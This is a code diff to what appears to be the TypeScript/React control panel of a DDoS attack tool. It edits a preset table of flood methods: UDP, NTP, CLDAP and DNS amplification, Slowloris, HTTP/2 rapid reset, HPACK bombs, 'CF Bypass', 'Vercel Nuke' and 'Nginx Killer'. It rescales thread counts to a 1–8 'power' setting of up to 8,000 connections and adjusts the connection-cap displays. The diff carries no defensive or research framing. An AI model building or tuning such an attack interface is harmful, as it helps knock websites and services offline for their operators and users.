@@ -127,36 +127,36 @@ function getSmartMethod(baseMethod: string, nodeIdx: number): string {
 
 /* ── Built-in presets ── */
 const PRESETS: Preset[] = [
-  { label: "Absolutum ∞",    method: "geass-absolutum",     packetSize: 512, duration: 300, delay: 0, threads: 5000, icon: "☠"  },
-  { label: "Geass Override", method: "geass-override",      packetSize: 512, duration: 300, delay: 0, threads: 3000, icon: "👁"  },
-  { label: "Geass Ultima",   method: "geass-ultima",        packetSize: 512, duration: 300, delay: 0, threads: 3000, icon: "🔱"  },
-  { label: "Origin Bypass",  method: "origin-bypass",       packetSize: 512, duration: 300, delay: 0, threads: 2000, icon: "🎯"  },
-  { label: "DNS NS Flood",   method: "dns-ns-flood",        packetSize: 512, duration: 300, delay: 0, threads: 2000, icon: "💀"  },
-  { label: "Bypass Storm",   method: "bypass-storm",        packetSize: 512, duration: 300, delay: 0, threads: 2000, icon: "🌪"  },
-  { label: "Nginx Killer",   method: "http2-continuation",  packetSize: 64,  duration: 180, delay: 0, threads: 1000, icon: "💀"  },
-  { label: "CF Bypass",      method: "waf-bypass",          packetSize: 512, duration: 300, delay: 0, threads: 1000, icon: "🌐"  },
-  { label: "DNS Torture",    method: "dns-amp",             packetSize: 64,  duration: 180, delay: 0, threads: 128,  icon: "📛"  },
-  { label: "H2 RST Burst",   method: "h2-rst-burst",        packetSize: 512, duration: 120, delay: 0, threads: 500,  icon: "⚡"  },
-  { label: "Pipeline Flood", method: "http-pipeline",       packetSize: 512, duration: 120, delay: 0, threads: 1000, icon: "🚇"  },
-  { label: "H2 Storm",       method: "h2-settings-storm",   packetSize: 64,  duration: 180, delay: 0, threads: 1000, icon: "🌊"  },
-  { label: "HPACK Bomb",     method: "hpack-bomb",          packetSize: 512, duration: 180, delay: 0, threads: 500,  icon: "🧨"  },
-  { label: "Conn Flood",     method: "conn-flood",          packetSize: 64,  duration: 300, delay: 0, threads: 500,  icon: "🔌"  },
-  { label: "Slowloris",      method: "slowloris",           packetSize: 32,  duration: 300, delay: 0, threads: 500,  icon: "🥷"  },
-  { label: "UDP Hammer",     method: "udp-flood",           packetSize: 1024,duration: 180, delay: 0, threads: 128,  icon: "💥"  },
-  { label: "NTP Nuclear",    method: "ntp-amp",             packetSize: 46,  duration: 120, delay: 0, threads: 128,  icon: "☢️"  },
-  { label: "HTTP Flood",     method: "http-flood",          packetSize: 64,  duration: 120, delay: 0, threads: 1000, icon: "🌊"  },
-  { label: "CLDAP Flood",    method: "cldap-amp",           packetSize: 62,  duration: 120, delay: 0, threads: 64,   icon: "📂"  },
-  { label: "TLS Exhaust",    method: "tls-session-exhaust", packetSize: 64,  duration: 180, delay: 0, threads: 500,  icon: "🔒"  },
-  { label: "Cache Bust",     method: "cache-buster",        packetSize: 64,  duration: 180, delay: 0, threads: 1000, icon: "💨"  },
-  { label: "Vercel Nuke",    method: "vercel-flood",        packetSize: 512, duration: 180, delay: 0, threads: 500,  icon: "▲"   },
-  { label: "Dep Bomb",       method: "h2-dep-bomb",         packetSize: 64,  duration: 180, delay: 0, threads: 800,  icon: "💣"  },
-  { label: "Data Exhaust",   method: "h2-data-flood",       packetSize: 64,  duration: 180, delay: 0, threads: 600,  icon: "🌊"  },
-  { label: "H2 Storm 6V",    method: "h2-storm",            packetSize: 64,  duration: 300, delay: 0, threads: 2000, icon: "⚡"  },
-  { label: "Rapid Reset",    method: "rapid-reset",         packetSize: 64,  duration: 300, delay: 0, threads: 800,  icon: "💥"  },
-  { label: "WS Bomb",        method: "ws-compression-bomb", packetSize: 64,  duration: 180, delay: 0, threads: 400,  icon: "💣"  },
-  { label: "GOAWAY Loop",    method: "h2-goaway-loop",      packetSize: 64,  duration: 180, delay: 0, threads: 600,  icon: "🔄"  },
-  { label: "SSE Exhaust",    method: "sse-exhaust",         packetSize: 64,  duration: 300, delay: 0, threads: 300,  icon: "📡"  },
-  { label: "H3 QUIC RST",   method: "h3-rapid-reset",      packetSize: 64,  duration: 300, delay: 0, threads: 800,  icon: "⚡"  },
+  { label: "Absolutum ∞",    method: "geass-absolutum",     packetSize: 512, duration: 300, delay: 0, threads: 8, icon: "☠"  },
+  { label: "Geass Override", method: "geass-override",      packetSize: 512, duration: 300, delay: 0, threads: 8, icon: "👁"  },
+  { label: "Geass Ultima",   method: "geass-ultima",        packetSize: 512, duration: 300, delay: 0, threads: 8, icon: "🔱"  },
+  { label: "Origin Bypass",  method: "origin-bypass",       packetSize: 512, duration: 300, delay: 0, threads: 8, icon: "🎯"  },
+  { label: "DNS NS Flood",   method: "dns-ns-flood",        packetSize: 512, duration: 300, delay: 0, threads: 6, icon: "💀"  },
+  { label: "Bypass Storm",   method: "bypass-storm",        packetSize: 512, duration: 300, delay: 0, threads: 8, icon: "🌪"  },
+  { label: "Nginx Killer",   method: "http2-continuation",  packetSize: 64,  duration: 180, delay: 0, threads: 6, icon: "💀"  },
+  { label: "CF Bypass",      method: "waf-bypass",          packetSize: 512, duration: 300, delay: 0, threads: 6, icon: "🌐"  },
+  { label: "DNS Torture",    method: "dns-amp",             packetSize: 64,  duration: 180, delay: 0, threads: 4, icon: "📛"  },
+  { label: "H2 RST Burst",   method: "h2-rst-burst",        packetSize: 512, duration: 120, delay: 0, threads: 6, icon: "⚡"  },
+  { label: "Pipeline Flood", method: "http-pipeline",       packetSize: 512, duration: 120, delay: 0, threads: 6, icon: "🚇"  },
+  { label: "H2 Storm",       method: "h2-settings-storm",   packetSize: 64,  duration: 180, delay: 0, threads: 6, icon: "🌊"  },
+  { label: "HPACK Bomb",     method: "hpack-bomb",          packetSize: 512, duration: 180, delay: 0, threads: 6, icon: "🧨"  },
+  { label: "Conn Flood",     method: "conn-flood",          packetSize: 64,  duration: 300, delay: 0, threads: 6, icon: "🔌"  },
+  { label: "Slowloris",      method: "slowloris",           packetSize: 32,  duration: 300, delay: 0, threads: 6, icon: "🥷"  },
+  { label: "UDP Hammer",     method: "udp-flood",           packetSize: 1024,duration: 180, delay: 0, threads: 4, icon: "💥"  },
+  { label: "NTP Nuclear",    method: "ntp-amp",             packetSize: 46,  duration: 120, delay: 0, threads: 4, icon: "☢️"  },
+  { label: "HTTP Flood",     method: "http-flood",          packetSize: 64,  duration: 120, delay: 0, threads: 6, icon: "🌊"  },
+  { label: "CLDAP Flood",    method: "cldap-amp",           packetSize: 62,  duration: 120, delay: 0, threads: 3, icon: "📂"  },
+  { label: "TLS Exhaust",    method: "tls-session-exhaust", packetSize: 64,  duration: 180, delay: 0, threads: 6, icon: "🔒"  },
+  { label: "Cache Bust",     method: "cache-buster",        packetSize: 64,  duration: 180, delay: 0, threads: 5, icon: "💨"  },
+  { label: "Vercel Nuke",    method: "vercel-flood",        packetSize: 512, duration: 180, delay: 0, threads: 6, icon: "▲"   },
+  { label: "Dep Bomb",       method: "h2-dep-bomb",         packetSize: 64,  duration: 180, delay: 0, threads: 6, icon: "💣"  },
+  { label: "Data Exhaust",   method: "h2-data-flood",       packetSize: 64,  duration: 180, delay: 0, threads: 6, icon: "🌊"  },
+  { label: "H2 Storm 6V",    method: "h2-storm",            packetSize: 64,  duration: 300, delay: 0, threads: 8, icon: "⚡"  },
+  { label: "Rapid Reset",    method: "rapid-reset",         packetSize: 64,  duration: 300, delay: 0, threads: 8, icon: "💥"  },
+  { label: "WS Bomb",        method: "ws-compression-bomb", packetSize: 64,  duration: 180, delay: 0, threads: 5, icon: "💣"  },
+  { label: "GOAWAY Loop",    method: "h2-goaway-loop",      packetSize: 64,  duration: 180, delay: 0, threads: 5, icon: "🔄"  },
+  { label: "SSE Exhaust",    method: "sse-exhaust",         packetSize: 64,  duration: 300, delay: 0, threads: 4, icon: "📡"  },
+  { label: "H3 QUIC RST",   method: "h3-rapid-reset",      packetSize: 64,  duration: 300, delay: 0, threads: 8, icon: "⚡"  },
 ];
 
 /* ── Log counter ── */
@@ -560,7 +560,7 @@ function Panel() {
   const [packetSize, setPacketSize] = useState(() => Number(localStorage.getItem("lb-packet-size")) || 64);
   const [duration, setDuration]   = useState(() => Number(localStorage.getItem("lb-duration"))     || 60);
   const [delay, setDelay]         = useState(() => Number(localStorage.getItem("lb-delay"))        || 100);
-  const [threads, setThreads]     = useState(() => Number(localStorage.getItem("lb-threads"))      || 16);
+  const [threads, setThreads]     = useState(() => Math.min(Number(localStorage.getItem("lb-threads")) || 8, 8));
   const [webhookUrl, setWebhookUrl] = useState(() => localStorage.getItem("lb-webhook-url") ?? "");
   const [showWebhook, setShowWebhook] = useState(() => localStorage.getItem("lb-show-webhook") === "1");
 
@@ -5635,8 +5635,9 @@ interface OriginResult { domain: string; isCloudflare: boolean; originIPs: strin
                 <input className="lb-num" type="number" min={1} max={3600} value={duration} onChange={e => setDuration(+e.target.value)}/>
               </div>
               <div className="lb-field">
-                <label>Threads</label>
-                <input className="lb-num" type="number" min={1} max={5000} value={threads} onChange={e => setThreads(+e.target.value)}/>
+                <label>Potência (1–8)</label>
+                <input className="lb-num" type="number" min={1} max={8} value={threads} onChange={e => setThreads(Math.min(8, Math.max(1, +e.target.value)))}/>
+                <span style={{ fontSize: 10, color: "#888", marginTop: 2 }}>→ {(Math.min(threads * 200, 8000)).toLocaleString()} conex./worker</span>
               </div>
               <div className="lb-field">
                 <label>Packet Delay (ms)</label>
@@ -6065,9 +6066,9 @@ interface OriginResult { domain: string; isCloudflare: boolean; originIPs: strin
                     {activeConns > 0 ? fmtNum(activeConns) : "…"}
                   </div>
                   <div className="lb-stat-sub">
-                    {method === "slowloris" ? `cap ${fmtNum(Math.min(Math.floor(Math.max(400, Math.round(threads * 0.08)) / 6) * 200, 100000) * 6)}` :
-                     method === "conn-flood" ? `cap ${fmtNum(Math.min(Math.floor(Math.max(400, Math.round(threads * 0.08)) / 6) * 150, 80000) * 6)}` :
-                     method === "ws-flood" ? `cap ${fmtNum(Math.min(threads * 200, 40000))}` :
+                    {method === "slowloris" ? `cap ${fmtNum(Math.min(Math.floor(Math.max(400, Math.round(Math.min(threads*200,8000) * 0.08)) / 6) * 200, 100000) * 6)}` :
+                     method === "conn-flood" ? `cap ${fmtNum(Math.min(Math.floor(Math.max(400, Math.round(Math.min(threads*200,8000) * 0.08)) / 6) * 150, 80000) * 6)}` :
+                     method === "ws-flood" ? `cap ${fmtNum(Math.min(Math.min(threads*200,8000) * 200, 40000))}` :
                      method === "geass-override" ? "35-vector conn hold" :
                      "conn hold"}
                   </div>
